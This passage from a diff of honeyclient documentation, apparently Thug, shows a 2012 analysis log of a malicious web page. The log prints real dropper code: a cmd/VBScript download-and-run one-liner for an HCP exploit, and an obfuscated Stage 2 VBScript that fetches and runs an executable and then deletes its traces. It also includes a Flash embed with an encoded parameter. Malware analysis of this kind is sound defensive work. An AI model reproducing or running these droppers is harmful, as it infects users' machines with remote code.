+<span class="linenos">31</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap1.php?f<span class="o">=</span>b081d <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
+<span class="linenos">32</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> Microsoft Internet Explorer HCP Scheme Detected
+<span class="linenos">33</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
+<span class="linenos">34</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>AST<span class="o">]</span>: Eval argument length &gt; <span class="m">64</span>
+<span class="linenos">35</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>Windows Script Host Run<span class="o">]</span> Command:
+<span class="linenos">36</span>       cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe
+<span class="linenos">37</span>
+<span class="linenos">38</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Code:
+<span class="linenos">39</span>       cmd /c <span class="nb">echo</span> <span class="nv">B</span><span class="o">=</span><span class="s2">&quot;l.vbs&quot;</span>:With CreateObject<span class="o">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="o">)</span>:.open <span class="s2">&quot;GET&quot;</span>,<span class="s2">&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;</span>,false:.send<span class="o">()</span>:Set <span class="nv">A</span> <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">&quot;Scripting.FileSystemObject&quot;</span><span class="o">)</span>:Set <span class="nv">D</span><span class="o">=</span>A.CreateTextFile<span class="o">(</span>A.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span> + <span class="s2">&quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;</span>WScript.Shell<span class="s2">&quot;).Run A.GetSpecialFolder(2) + &quot;</span><span class="se">\&quot;</span> + B &gt; %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> %TEMP%<span class="se">\\</span>l.vbs <span class="o">&amp;&amp;</span> taskkill /F /IM helpctr.exe
+<span class="linenos">40</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:36<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Downloading from URL http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span>
+<span class="linenos">41</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:37<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/hcp_vbs.php?f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span><span class="m">0</span> <span class="o">(</span>Status: <span class="m">200</span>, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
+<span class="linenos">42</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:37<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">1</span><span class="o">]</span> Saving file d26b9b1a1f667004945d1d000cf4f19e
+<span class="linenos">43</span>       <span class="o">[</span><span class="m">2012</span>-07-02 <span class="m">19</span>:15:37<span class="o">]</span> <span class="o">[</span>Windows Script Host Run - Stage <span class="m">2</span><span class="o">]</span> Code:
+<span class="linenos">44</span>       <span class="nv">w</span><span class="o">=</span><span class="m">3000</span>:x<span class="o">=</span><span class="m">200</span>:y<span class="o">=</span><span class="m">1</span>:z<span class="o">=</span>false:a <span class="o">=</span> <span class="s2">&quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;</span>:Set <span class="nv">e</span> <span class="o">=</span> Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>:Set <span class="nv">f</span><span class="o">=</span>e.GetSpecialFolder<span class="o">(</span><span class="m">2</span><span class="o">)</span>:b <span class="o">=</span> f <span class="p">&amp;</span> <span class="s2">&quot;\exe.ex2&quot;</span>:b<span class="o">=</span>Replace<span class="o">(</span>b,Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>,<span class="s2">&quot;e&quot;</span><span class="o">)</span>:OT <span class="o">=</span> <span class="s2">&quot;GET&quot;</span>:Set <span class="nv">c</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;PTTHLMX.2LMXSM&quot;</span><span class="o">))</span>:Set <span class="nv">d</span> <span class="o">=</span> CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;ertS.BDODA&quot;</span><span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;am&quot;</span><span class="o">)</span>
+<span class="linenos">45</span>       Set <span class="nv">o</span><span class="o">=</span>Createobject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;tcejbOmetsySeliF.gnitpircS&quot;</span><span class="o">))</span>
+<span class="linenos">46</span>       On Error resume next
+<span class="linenos">47</span>       c.open OT, a, z:c.send<span class="o">()</span>
+<span class="linenos">48</span>       If c.Status <span class="o">=</span> x Then
+<span class="linenos">49</span>       d.Open:d.Type <span class="o">=</span> y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
+<span class="linenos">50</span>       End If
+<span class="linenos">51</span>       Set <span class="nv">w</span><span class="o">=</span>CreateObject<span class="o">(</span>StrReverse<span class="o">(</span><span class="s2">&quot;llehS.&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;tpi&quot;</span><span class="p">&amp;</span><span class="s2">&quot;rcSW&quot;</span><span class="o">))</span>
+<span class="linenos">52</span>       Eval<span class="o">(</span>Replace<span class="o">(</span><span class="s2">&quot;W.ex2c b&quot;</span>, Month<span class="o">(</span><span class="s2">&quot;2010-02-16&quot;</span><span class="o">)</span>, <span class="s2">&quot;E&quot;</span><span class="o">))</span>
+<span class="linenos">53</span>       W.eXeC <span class="s2">&quot;taskkill /F /IM wm&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;player.e&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;xe&quot;</span>:W.eXeC <span class="s2">&quot;taskkill /F /IM realplay.ex&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;e&quot;</span>:Set <span class="nv">g</span><span class="o">=</span>o.GetFile<span class="o">(</span>e.GetSpecialFolder<span class="o">(</span><span class="m">3</span>-1<span class="o">)</span> <span class="p">&amp;</span> <span class="s2">&quot;\&quot; &amp; StrReverse(&quot;</span>bv.l<span class="s2">&quot;) &amp; &quot;</span>s<span class="s2">&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;</span>g.Delete<span class="s2">&quot;)</span>
+<span class="linenos">54</span>
+<span class="linenos">55</span><span class="s2">       [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d</span>
+<span class="linenos">56</span><span class="s2">       [2012-07-02 19:15:43] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
+<span class="linenos">57</span><span class="s2">       [2012-07-02 19:15:45] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a</span>
+<span class="linenos">58</span><span class="s2">       [2012-07-02 19:15:45] &lt;object classid=&quot;</span>clsid:d27cdb6e-ae6d-11cf-96b8-444553540000<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;&lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;&lt;/object&gt;</span>
+<span class="linenos">59</span><span class="s2">       [2012-07-02 19:15:45] &lt;param name=&quot;</span>b<span class="s2">&quot; value=&quot;</span><span class="m">56</span>:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12<span class="s2">&quot;&gt;&lt;/param&gt;</span>
+<span class="linenos">60</span><span class="s2">       [2012-07-02 19:15:45] &lt;param name=&quot;</span>movie<span class="s2">&quot; value=&quot;</span>data/field.swf<span class="s2">&quot;&gt;&lt;/param&gt;</span>
+<span class="linenos">61</span><span class="s2">       [2012-07-02 19:15:45] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
+<span class="linenos">62</span><span class="s2">       [2012-07-02 19:15:52] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
+<span class="linenos">63</span><span class="s2">       [2012-07-02 19:15:52] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
+<span class="linenos">64</span><span class="s2">       [2012-07-02 19:15:52] &lt;param name=&quot;</span>allowScriptAccess<span class="s2">&quot; value=&quot;</span>always<span class="s2">&quot;&gt;&lt;/param&gt;</span>
+<span class="linenos">65</span><span class="s2">       [2012-07-02 19:15:52] &lt;param name=&quot;</span>Play<span class="s2">&quot; value=&quot;</span><span class="m">0</span><span class="s2">&quot;&gt;&lt;/param&gt;</span>
+<span class="linenos">66</span><span class="s2">       [2012-07-02 19:15:52] &lt;embed allowscriptaccess=&quot;</span>always<span class="s2">&quot; height=&quot;</span><span class="m">10</span><span class="s2">&quot; id=&quot;</span>swf_id<span class="s2">&quot; name=&quot;</span>swf_id<span class="s2">&quot; src=&quot;</span>data/field.swf<span class="s2">&quot; type=&quot;</span>application/x-shockwave-flash<span class="s2">&quot; width=&quot;</span><span class="m">10</span><span class="s2">&quot;&gt;&lt;/embed&gt;</span>
+<span class="linenos">67</span><span class="s2">       [2012-07-02 19:15:52] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf</span>
+<span class="linenos">68</span><span class="s2">       [2012-07-02 19:15:53] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)</span>
+<span class="linenos">69</span><span class="s2">       [2012-07-02 19:15:53] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)</span>
+<span class="linenos">70</span><span class="s2">       [2012-07-02 19:15:53] Saving log analysis at /tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511</span>
 </pre></div>
-</td></tr></table></div>
+</div>
 <p>Let’s take a look at the directory which contains the logs for this session</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>~ $ <span class="nb">cd</span> /tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511
 /tmp/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511 $ ls -lhR
